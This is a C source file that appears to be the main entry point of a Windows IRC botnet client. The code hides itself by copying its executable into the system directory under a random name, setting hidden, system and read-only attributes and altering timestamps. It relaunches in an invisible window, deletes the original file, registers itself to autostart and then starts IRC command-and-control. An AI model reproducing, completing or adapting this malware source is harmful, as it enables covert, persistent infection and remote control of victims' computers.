#include "includes.h"
#include "functions.h"
#include "configs.h"
#include "passwd.h"
#include "globals.h"

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
	char fname[_MAX_FNAME],ext[_MAX_EXT],rfilename[MAX_PATH],cfilename[MAX_PATH],sysdir[MAX_PATH];

	#ifndef NO_EHANDLER
	DWORD handler = (DWORD)_except_handler;
	_asm
	{ 
		push    handler       
		push    FS:[0]  
		mov     FS:[0],ESP 
	}
	#endif

	LoadDLLs();

	
	fSetErrorMode(SEM_NOGPFAULTERRORBOX);

	
	if (WaitForSingleObject(CreateMutex(NULL, TRUE, botid), 30000) == WAIT_TIMEOUT)
		ExitProcess(EXIT_FAILURE);

	#ifndef NO_CRYPT
	decryptstrings((sizeof(authost) / sizeof(LPTSTR)), (sizeof(versionlist) / sizeof(LPTSTR)));
	#endif

	GetSystemDirectory(sysdir, sizeof(sysdir));
	GetModuleFileName(GetModuleHandle(NULL), cfilename, sizeof(cfilename));
	_splitpath(cfilename, NULL, NULL, fname, ext);
	_snprintf(rfilename, sizeof(rfilename), "%s%s", fname, ext);

	if (strstr(cfilename, sysdir) == NULL) {
		char tmpfilename[MAX_PATH];
		if (rndfilename) {
			for (unsigned int i=0;i < (strlen(filename) - 4);i++)
				filename[i] = (char)((rand() % 26) + 97);
		}
		sprintf(tmpfilename, "%s\\%s", sysdir, filename);

		if (GetFileAttributes(tmpfilename) != INVALID_FILE_ATTRIBUTES)
			SetFileAttributes(tmpfilename,FILE_ATTRIBUTE_NORMAL);

		
		BOOL bFileCheck=FALSE;
		while (CopyFile(cfilename, tmpfilename, FALSE) == FALSE) {
			DWORD result = GetLastError();

			if (!bFileCheck && (result == ERROR_SHARING_VIOLATION || result == ERROR_ACCESS_DENIED)) {
				bFileCheck=TRUE;
				Sleep(15000);
			} else
				break;
		}
		SetFileTime(tmpfilename);
		SetFileAttributes(tmpfilename,FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_READONLY);

		PROCESS_INFORMATION pinfo;
		STARTUPINFO sinfo;
		memset(&pinfo, 0, sizeof(pinfo));
		memset(&sinfo, 0, sizeof(sinfo));
		sinfo.lpTitle     = "";
		sinfo.cb = sizeof(sinfo);
		sinfo.dwFlags = STARTF_USESHOWWINDOW;
		#ifdef DEBUG_CONSOLE
		sinfo.wShowWindow = SW_SHOW;
		#else
		sinfo.wShowWindow = SW_HIDE;
		#endif
		
		char cmdline[MAX_PATH];
		HANDLE hProcessOrig = OpenProcess(SYNCHRONIZE, TRUE, GetCurrentProcessId());
		sprintf(cmdline,"%s %d \"%s\"",tmpfilename, hProcessOrig, cfilename);

		if (CreateProcess(tmpfilename, cmdline, NULL, NULL, TRUE, NORMAL_PRIORITY_CLASS | DETACHED_PROCESS, NULL, sysdir, &sinfo, &pinfo)) {
			Sleep(200);
			CloseHandle(pinfo.hProcess);
			CloseHandle(pinfo.hThread);
			fWSACleanup();
			ExitProcess(EXIT_SUCCESS);
		}
	}

	#ifndef NO_MELT
	if (__argc > 2) {
		HANDLE hProcessOrig = (HANDLE) atoi(__argv[1]);
		WaitForSingleObject(hProcessOrig, INFINITE);
		CloseHandle(hProcessOrig);

		if (__argv[2]) {
			Sleep(5000); 
			DeleteFile(__argv[2]);
		}
	}
	#endif

	if ((AutoStart) && !(noadvapi32)) 
		AutoStartRegs(rfilename);

	IRC_Startup();

	return 0;
}
